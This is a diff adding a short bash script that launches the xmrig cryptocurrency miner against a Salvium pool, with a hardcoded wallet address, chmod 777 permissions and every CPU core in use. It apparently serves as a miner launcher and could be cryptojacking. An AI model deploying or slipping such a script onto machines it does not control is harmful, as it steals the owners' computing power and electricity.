@@ -1,0 +1,6 @@
+#!/bin/bash
+A=sg.salvium.herominers.com:1230
+B=SaLvsBkggaZbHsXJoYQnuhZeaQD8aKjXqP882vZmTBkneBdrZw9KH1BfkcaD16GEitJSDmteoTsYVH2CVXZz2NbuVuR8qhi4ueV
+C=HEHE
+chmod 777 xmrig SHA256SUMS
+./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all)
